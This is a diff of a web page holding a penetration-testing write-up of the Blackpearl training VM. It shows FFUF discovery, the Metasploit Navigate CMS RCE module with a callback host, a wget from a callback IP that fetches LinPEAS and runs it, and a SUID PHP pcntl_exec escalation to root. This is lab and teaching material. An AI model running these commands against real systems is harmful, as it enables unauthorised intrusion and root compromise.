@@ -6,34 +6,34 @@
 <div class="reading-layout"><div class="reading-toc"><details class="contents-menu" open><summary>On this page <span aria-hidden="true">⌄</span></summary><nav aria-label="On this page"><a href="#environment">Target environment</a><a href="#method">1. DNS enumeration and hostname resolution</a><a href="#section-2-web-content-discovery">2. Web content discovery</a><a href="#section-3-vulnerability-research">3. Vulnerability research</a><a href="#section-4-initial-access">4. Initial access</a><a href="#section-5-shell-stabilization-and-local-enumeration">5. Shell stabilization and local enumeration</a><a href="#section-6-linpeas-enumeration">6. LinPEAS enumeration</a><a href="#section-7-suid-php-investigation">7. SUID PHP investigation</a><a href="#section-8-privilege-escalation">8. Privilege escalation</a><a href="#evidence-limits">9. Result and evidence limits</a><a href="#attack-path">10. Attack path</a><a href="#findings">11. Findings and remediation</a></nav></details></div><div class="reading-body"><h2 id="environment">Target environment</h2><ul class="environment"><li><span class="environment-item"><strong>Target:</strong> Blackpearl</span></li><li><span class="environment-item"><strong>Operating system:</strong> Linux</span></li><li><span class="environment-item"><strong>Architecture:</strong> x86_64 (64-bit)</span></li><li><span class="environment-item"><strong>Service / application:</strong> Nginx 1.14.2; Navigate CMS 2.8</span></li><li><span class="environment-item"><strong>Weakness investigated:</strong> Navigate CMS remote code execution; root-owned SUID PHP interpreter</span></li><li><span class="environment-item"><strong>Scope:</strong> Intentionally vulnerable, isolated training VM</span></li></ul>
 <h2 id="method">1. DNS enumeration and hostname resolution</h2>
 <p>I used DNSRecon to enumerate the target and identify <code>blackpearl.tcm</code>. My notes did not preserve the exact DNSRecon command or the returned records, so the command below is representative rather than terminal history.</p>
-<p>Address placeholders replace lab addresses throughout the text and commands. They are not literal shell arguments; substitute the appropriate isolated-lab values before use. Recorded ports and command syntax are otherwise preserved. Redaction does not turn representative or reconstructed commands into captured execution evidence.</p><pre tabindex="0" role="region" aria-label="Lab commands and output"><code>dnsrecon -d blackpearl.tcm</code></pre>
+<p>Address placeholders replace lab addresses throughout the text and commands. They are not literal shell arguments; substitute the appropriate isolated-lab values before use. Recorded ports and command syntax are otherwise preserved. Redaction does not turn representative or reconstructed commands into captured execution evidence.</p><p class="command-provenance">Representative command</p><pre tabindex="0" role="region" aria-label="Representative command"><code>dnsrecon -d blackpearl.tcm</code></pre>
 <p>I mapped the hostname to the target in <code>/etc/hosts</code> on Kali and on my Mac, then verified resolution with <code>getent</code>. My notes record this entry and output:</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>sudo nano /etc/hosts
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>sudo nano /etc/hosts
 # added:
 &lt;TARGET_IP&gt; blackpearl.tcm
 
 getent hosts blackpearl.tcm
 &lt;TARGET_IP&gt; blackpearl.tcm</code></pre>
 <p>I checked HTTP connectivity with <code>curl</code>. The server responded with HTTP 200 OK and identified itself as Nginx 1.14.2.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>curl -I http://blackpearl.tcm
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>curl -I http://blackpearl.tcm
 HTTP/1.1 200 OK
 Server: nginx/1.14.2
 Content-Type: text/html; charset=UTF-8</code></pre>
 <h2 id="section-2-web-content-discovery">2. Web content discovery</h2>
 <p>I used FFUF with the medium DirBuster wordlist to discover exposed web content.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>ffuf -u http://blackpearl.tcm/FUZZ \
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>ffuf -u http://blackpearl.tcm/FUZZ \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
 <p>Numerous requests returned identical responses (status 200, 652 bytes, 82 words, 27 lines), which I treated as a repeated baseline rather than real content. One result differed:</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>secret [Status: 200, Size: 209, Words: 31, Lines: 9]</code></pre>
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>secret [Status: 200, Size: 209, Words: 31, Lines: 9]</code></pre>
 <p>I reran FFUF with <code>-fs 652</code> to filter the baseline size and <code>-s</code> for silent output. A different response was a lead to inspect, not proof of a useful endpoint.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>ffuf -u http://blackpearl.tcm/FUZZ \
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>ffuf -u http://blackpearl.tcm/FUZZ \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -fs 652 -s</code></pre>
 <p>Further enumeration discovered <code>/navigate</code>, which exposed <mark class="attack-key">Navigate CMS</mark> 2.8. That became my target for initial access; <code>/secret</code> was a separate result and was not the access vector.</p>
 <h2 id="section-3-vulnerability-research">3. Vulnerability research</h2>
 <p>Discovery of <code>/navigate</code> identified Navigate CMS 2.8, making version-specific vulnerability research the next check. The walkthrough identifies a <a href="https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/">Metasploit module</a> that chains authentication bypass with path traversal in the upload handler to place and execute PHP code. A matching version and available module were leads to test, not proof that this instance was exploitable; the later documented <code>www-data</code> shell is the execution result.</p>
 <p>I selected the module and configured the target, virtual host and callback. The capture below shows the <code>LHOST</code>, <code>RHOST</code> and <code>VHOST</code> settings. <code>TARGETURI</code> is reconstructed from the <code>/navigate</code> discovery and is not visible in the capture.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>msfconsole
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>msfconsole
 search navigate_cms
 use exploit/multi/http/navigate_cms_rce
 show options
@@ -47,35 +47,35 @@ exploit</code></pre>
 <p>This established remote command execution under the web service account, but I still needed to identify a local privilege escalation path.</p>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-foothold.png?v=lab-originals-1" alt="Meterpreter opens a shell and whoami returns www-data" width="287" height="134" loading="lazy" decoding="async"></div><figcaption>Lab capture: initial shell identity is www-data.</figcaption></figure><h2 id="section-5-shell-stabilization-and-local-enumeration">5. Shell stabilization and local enumeration</h2>
 <p>The initial shell had limited terminal functionality. Python was available, so I used its <code>pty</code> module to spawn an interactive Bash shell.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-pty.png?v=lab-originals-1" alt="Python pty.spawn launches Bash in the www-data shell" width="485" height="49" loading="lazy" decoding="async"></div><figcaption>Lab capture: Python PTY shell stabilization.</figcaption></figure><p>I inspected my user identity, group memberships, sudo permissions and shell history. These checks did not reveal a useful escalation path, so I continued with broader local enumeration.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>whoami
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>whoami
 id
 sudo -l
 history</code></pre>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-local-checks.png?v=lab-originals-1" alt="sudo is unavailable and shell history contains no useful escalation commands" width="560" height="193" loading="lazy" decoding="async"></div><figcaption>Lab capture: sudo and history checks.</figcaption></figure><h2 id="section-6-linpeas-enumeration">6. LinPEAS enumeration</h2>
 <p>I hosted LinPEAS, a Linux privilege escalation enumeration script, from Kali using Python’s HTTP server on port 80.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>python3 -m http.server 80</code></pre>
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>python3 -m http.server 80</code></pre>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-transfer.png?v=lab-originals-1" alt="Kali Python HTTP server on port 80 logs a successful request for linpeas.sh" width="678" height="95" loading="lazy" decoding="async"></div><figcaption>Lab capture: LinPEAS transfer on port 80.</figcaption></figure><p>On Blackpearl, I downloaded the script to <code>/tmp</code>, made it executable and ran it. The server log above confirms the download; the exact download command was not captured, so <code>wget</code> below is representative.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>cd /tmp
+<p class="command-provenance">Representative command</p><pre tabindex="0" role="region" aria-label="Representative command"><code>cd /tmp
 wget http://&lt;CALLBACK_IP&gt;/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh</code></pre>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-linpeas.png?v=lab-originals-1" alt="The www-data shell makes linpeas.sh executable and starts it" width="444" height="83" loading="lazy" decoding="async"></div><figcaption>Lab capture: LinPEAS execution.</figcaption></figure><p>I reviewed the results for SUID/SGID executables, writable paths, privileged processes, scheduled tasks and configuration weaknesses. The enumeration identified PHP 7.3 as a potential privilege escalation vector.</p>
 <h2 id="section-7-suid-php-investigation">7. SUID PHP investigation</h2>
 <p>I enumerated SUID (set user ID) binaries—executables that run with their owner’s effective privileges—and inspected <code>/usr/bin/php7.3</code>.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>find / -type f -perm -4000 2&gt;/dev/null
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>find / -type f -perm -4000 2&gt;/dev/null
 ls -l /usr/bin/php7.3</code></pre>
 <p>I identified the root-owned PHP interpreter as an executable that could run with elevated effective privileges. The permission listing itself was not captured.</p>
 <p>The documented root ownership and SUID configuration made PHP's process-execution features relevant to the next check. <a href="https://gtfobins.github.io/gtfobins/php/">GTFOBins</a> describes using <code>pcntl_exec()</code> to launch a shell while retaining elevated privileges. The permission listing was not captured, so that configuration remains documented context; the subsequent shell and root identity are the page's selected execution evidence.</p>
 <h2 id="section-8-privilege-escalation">8. Privilege escalation</h2>
 <p>My first attempt failed because of incorrect shell syntax:</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>bash: syntax error near unexpected token ')'</code></pre>
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>bash: syntax error near unexpected token ')'</code></pre>
 <p>I corrected the quoting and executed:</p>
-<pre tabindex="0" role="region" aria-label="PHP privilege escalation command"><code>/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'</code></pre>
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'</code></pre>
 <p>This was a permissions problem, not a PHP vulnerability: a general-purpose interpreter had been granted root privileges. <code>pcntl_exec()</code> replaced the PHP process with <code>/bin/sh</code>, and the <code>-p</code> option preserved the elevated effective privileges inherited from the SUID interpreter.</p>
 <p>I ran <code>whoami</code> in the resulting shell and received <code>root</code>, confirming successful privilege escalation.</p>
-<pre tabindex="0" role="region" aria-label="Lab commands and output"><code>www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
+<p class="command-provenance">Documented command</p><pre tabindex="0" role="region" aria-label="Documented command"><code>www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
 # whoami
 root</code></pre>
 <figure class="evidence"><div class="evidence-scroll" role="region" aria-label="Lab screenshot; scroll horizontally on a narrow screen" tabindex="0"><img src="evidence/blackpearl-root.png?v=lab-originals-1" alt="SUID PHP pcntl_exec command starts a shell and whoami returns root" width="714" height="120" loading="lazy" decoding="async"></div><figcaption>Lab capture: PHP privilege escalation and root verification.</figcaption></figure><p>My notes record that the original low-privileged UID remained visible. That is expected when the real UID stays <code>www-data</code> while the effective UID is root; the full <code>id</code> output was not preserved.</p>
